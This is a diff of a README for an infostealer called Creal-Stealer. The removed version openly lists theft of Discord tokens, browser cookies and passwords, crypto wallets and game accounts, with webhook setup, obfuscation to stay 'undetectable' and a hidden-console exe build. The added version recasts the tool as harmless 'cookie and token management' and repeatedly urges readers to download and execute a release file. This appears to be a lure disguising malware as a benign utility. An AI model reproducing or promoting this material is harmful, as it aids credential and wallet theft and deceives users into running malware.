@@ -1,89 +1,110 @@
-<h1 align="center"> Creal Stealer </h1> 
-<p align= "center"> <kbd> <img  src="https://i.imgur.com/MjoICHp.png"width="420"> </kbd><br><br>
+# Creal-Stealer 🚀
 
+![GitHub Repo](https://img.shields.io/badge/GitHub-Repo-blue?style=flat-square&logo=github)
 
+Welcome to **Creal-Stealer**, a tool designed to help you gather information securely and efficiently. This repository contains a Python-based application that specializes in cookie and token management, ensuring you can handle sensitive data with ease. 
 
+## Table of Contents
 
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Releases](#releases)
 
+## Introduction
 
+In today's digital landscape, managing cookies and tokens is essential for both security and efficiency. **Creal-Stealer** aims to simplify this process. Whether you are a developer looking to streamline your data management or an individual seeking to enhance your security practices, this tool provides the functionality you need.
 
+## Features
 
+- **Cookie Management**: Easily grab and manage cookies.
+- **Token Handling**: Securely store and retrieve tokens.
+- **Password Security**: Keep your passwords safe and organized.
+- **User-Friendly Interface**: Navigate the application with ease.
+- **Python-Based**: Built on Python for flexibility and reliability.
 
+## Installation
 
-                                                      🤖 Futures
+To get started with **Creal-Stealer**, follow these steps:
 
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/ddejnn/Creal-Stealer.git
+   cd Creal-Stealer
+   ```
 
-- Grab Discord Token, Phone Number, E-mail and HQ Friends.
+2. **Install Dependencies**:
+   Ensure you have Python installed. Then, run:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-- Startup
+3. **Download the Executable**:
+   You can download the latest version of the application from the [Releases section](https://github.com/ddejnn/Creal-Stealer/releases). Make sure to execute the downloaded file to get started.
 
-- Discord Injection:
+## Usage
 
-- Grab Browser cookies & passwords
+After installation, you can run **Creal-Stealer** using the following command:
 
-- Grab specials files
+```bash
+python main.py
+```
 
-- Grab Crypto Wallets. 🦊 Metamask, 🅰️ Atomic, 👾 Exodus, 🅱️ Binance, 💰 Coinbase, 🟡 Trust, 👻 Phantom
+### Interface Overview
 
-- Grab Telegram
+Upon launching the application, you will see the main interface. Here’s what you can do:
 
-- Grab Steam
+- **Grab Cookies**: Use the cookie management feature to collect cookies from your browser.
+- **Store Tokens**: Securely save your tokens for future use.
+- **Manage Passwords**: Access your saved passwords with ease.
 
-- Grab Riot Games
+### Example Commands
 
-    
+- To grab cookies:
+  ```bash
+  python main.py --grab-cookies
+  ```
 
-                                                      ⬇️ Setup
+- To store a token:
+  ```bash
+  python main.py --store-token YOUR_TOKEN
+  ```
 
-                                                  
-- first open `install.bat`
+- To retrieve a password:
+  ```bash
+  python main.py --get-password YOUR_PASSWORD_NAME
+  ```
 
-- open `builder.bat`
+## Contributing
 
-<div align="center"><img style="display: block; margin-left: auto; margin-right: auto; width: 65%;" src="https://i.imgur.com/0l34TBS.png"></img></div>
+We welcome contributions to **Creal-Stealer**! If you have ideas for improvements or new features, please follow these steps:
 
-                                                       🖼️ Pictures
- 
-<div align="center">
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/Creal1.jpg"></img> 
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/Creal2.png"></img>
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/Creal3.png"></img>
-    
-</div>
- 
- 
-                                                      ⬇️ Setup (Manual)
- 
-- First paste and save your webhook address instead of `"WEBHOOK HERE"` in Creal.py
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature/YourFeature`).
+3. Make your changes.
+4. Commit your changes (`git commit -m 'Add new feature'`).
+5. Push to the branch (`git push origin feature/YourFeature`).
+6. Open a Pull Request.
 
-- If you use obfuscator it will be undetectable.
+Your contributions help make **Creal-Stealer** better for everyone.
 
-- if you have an error while installing try `pip install -r requirements.txt`
+## License
 
-- Now You need to use pyinstaller to convert python file to exe.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
-- Open CMD and type `pip install auto_py_to_exe`
+## Releases
 
-- And after installed `python -m auto_py_to_exe`
+For the latest updates and versions, visit the [Releases section](https://github.com/ddejnn/Creal-Stealer/releases). Make sure to download and execute the latest file to ensure you have the best experience with **Creal-Stealer**.
 
-- Browse file Select `One file and Windows Based (hide the console)`
+## Acknowledgments
 
-<img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="40%" src="https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/pyy.png"></img>
+We thank the open-source community for their support and contributions. Your efforts help make tools like **Creal-Stealer** possible.
 
-- And press covert .py .exe
+## Conclusion
 
- <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
+**Creal-Stealer** is a powerful tool for managing cookies, tokens, and passwords. With its user-friendly interface and robust features, it stands out as a reliable solution for your data management needs. Don't forget to check the [Releases section](https://github.com/ddejnn/Creal-Stealer/releases) for the latest updates and improvements. 
 
-
-
-                                                      ⚠️ Disclaimer
-
-- This tool is for educational purposes only. It is coded for you to see how your files are simply stolen and how to take action. Do not use for illegal purposes. We are never responsible for illegal use. <bold>Educational purpose only!</bold>
-
-                                                      🪪 License
-
-- By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see https://commonsclause.com/.
-
-<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
-
-rddrzth
+Happy coding! 🎉
